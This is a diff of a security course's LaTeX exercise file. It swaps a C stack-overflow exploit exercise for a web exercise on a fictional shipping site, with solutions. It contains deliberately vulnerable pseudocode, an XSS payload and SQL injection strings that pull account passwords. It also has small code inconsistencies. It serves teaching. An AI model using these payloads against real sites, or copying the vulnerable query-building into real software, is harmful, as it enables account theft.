@@ -1,59 +1,77 @@
-\section{Exercise two}
+\section{Exercise 2}
 
-Consider the C program below:
+“SHIPSTUFF” is a new online service that allow registered users to send stuff to other registered users by filling a form. 
+The form must contain the product\_id of the product to send and the receiver\_id of the receiver. 
+After clicking on the submit button, the web browser will make the following GET request to the web server:
+\begin{verbatim}
+https://shipstuff.org/ship?product_id=<product_id>&receiver_id=<receiver_id>
+\end{verbatim}
+The Python-like pseudocode that will handle the shipment is the following:
 \begin{verbnobox}[\verbarg]
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <stdint.h>
+def ship_stuff(request):
+    # code to send HTTP header (not relevant) 
+    user = check_cookie(request.cookie)
+    if user is None:
+        print "Please log in first"
+        return
 
-void vuln() {
-    char str[8];
+    product_id = request.params['product_id'] # GET parameter
+    receiver_id = request.params['receiver_id'] # GET parameter
 
-    scanf("%25s", str);
-    strrev(str); // reverse the string
-    if (strncmp(str, "DAVINCI:", 8) == 0) {
-        printf(“%s”, str);
-        return;
-    }
-    else
-        abort();
-}
+    query1 = 'SELECT p_id, product_name FROM warehouse, ownership WHERE p_id = ' + product_id + 'AND user.id = ownership.u_id ' + 'AND ownership.p_id = warehouse.p_id;'
+    db.execute(query)
+    row = db.fetchone()
+    if row is None:
+        print "Product", product_id, "is not existent"
+        return
 
-void main(int argc, char** argv) {
-    vuln()
-}
+    query2 = 'SELECT u_id, username FROM accounts WHERE u_id = ' + receiver_id + ';'
+    db.execute(query)
+    row = db.fetchone()
+    if row is None:
+        print "User", receiver_id, "is not existent"
+        return
+    # code to actually send the product and print the product name 
 \end{verbnobox}
+The above code checks if the user is logged in using the function check\_cookie, which returns the username of the authenticated user checking the session cookie. 
+Then, the code attempts to retrieve the product\_id or the receiver\_id from the database and, if they cannot be located the page will contain an error message.
+Assume that request.params['product\_id'] and request.params[receiver\_id'] are controllable by the user, and that all the functionalities concerning the user authentication (i.e., check\_cookie) are securely implemented and do not contain vulnerabilities.
+
+Now assume that SHIPSTUFF executes all the database queries against the following tables:
+\begin{itemize}
+    \item Accounts: UserID, Username, Password. 
+    \item Ownership: UserID, ProductID. 
+    \item Warehouse: ProductID, ProductName.
+\end{itemize}
 \begin{enumerate}
-    \item The program is affected by a typical buffer overflow. 
-        Find the line affected and describe the reason. 
-    \item Write an exploit for this vulnerability that must execute the following shell code, composed of 8 bytes, which opens a shell: \texttt{0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90}.
-        Describe all the steps and assumptions required to successfully exploit the vulnerability. 
-        Include also any assumption on how you must call and run the program: e.g., the values for the command-line arguments required to trigger the exploit correctly and/or environment variables (if any), the input provided during the execution, if multiple executions are necessary. 
-    \item Make sure that you show how the exploit will appear in the process memory with respect to the stack layout right before and after the execution of the vulnerable line during the program exploitation showing:
-        \begin{itemize}
-            \item Direction of growth and high-low addresses.
-            \item The name of each allocated variable.
-            \item The content of relevant registers.
-            \item The functions stack frames.
-        \end{itemize}
+    \item Only considering the code above, identify which of the following classes of web application vulnerabilities are present. 
+    \item Write an exploit for one of the vulnerability/ies just identified to get the username and the password of the only user that owns the product excalibur.
+    By assuming that products are unique, state all the necessary steps and conditions for the exploit to take place.
 \end{enumerate}
 
 \subsection*{Solution}
 \begin{enumerate}
-    \item The buffer overflow occurs on line eight due to the buffer being sized at eight, while the program attempts to read 25 characters.
-    \item The input required to exploit the vulnerability is as follows:
-        \begin{verbatim}
-DAVINCI:AAAA<ptr_to_shell code>\x31\x32\x33\x34\x35\x36\x37\x38
-        \end{verbatim}
-        However, due to the \texttt{strrev}, we need to revert the string. 
-        Hence the input will be:
-        \begin{verbatim}
-\x38\x37\x36\x35\x34\x33\x32\x31<ptr_to_shell code_inv>AAAA:ICNIVAD
-        \end{verbatim}
-    \item The stack is: 
-    \begin{figure}[H]
-        \centering
-        \includegraphics[width=0.85\linewidth]{images/stack2.png}
-    \end{figure}
+    \item We have the following vulnerabilities: 
+        \begin{itemize}
+            \item Reflected XSS: an attacker can supply a product\_id or the receiver\_id containing e.g.,
+\begin{verbatim}
+<script>alert(document.cookie)</script>
+\end{verbatim}
+                and the web server would print that script tag to the browser, and the browser will run the code from the URL.
+                The simplest procedure to prevent this vulnerability is to apply escaping/filtering to the vulnerable variable. For example: \texttt{product\_id}. 
+            \item CSFR: an attacker can send a link to a victim and let the victim ship a product to him by just visiting the link. 
+                The simplest procedure to prevent this vulnerability is to apply CSRF token.
+            \item SQL injection: user-controlled data is concatenated a query, allowing an attacker to modify such query.
+                The simplest procedure to prevent this vulnerability is to apply prepared statement
+        \end{itemize}
+    \item We need to modify the queries as follows: 
+\begin{verbatim}
+0 AND 0=1 UNION SELECT a.u_id, a.password FROM accounts AS a,
+ownership AS o, products AS p WHERE o.u_id = a.u_id AND o.p_id 
+= p.p_id AND p.product_name = 'excalibur';--
+
+0 AND 0=1 UNION SELECT a.u_id, a.username FROM accounts AS a,
+ownership AS o, products AS p WHERE o.u_id = a.u_id AND o.p_id 
+= p.p_id AND p.product_name = 'excalibur';--
+\end{verbatim}
 \end{enumerate}
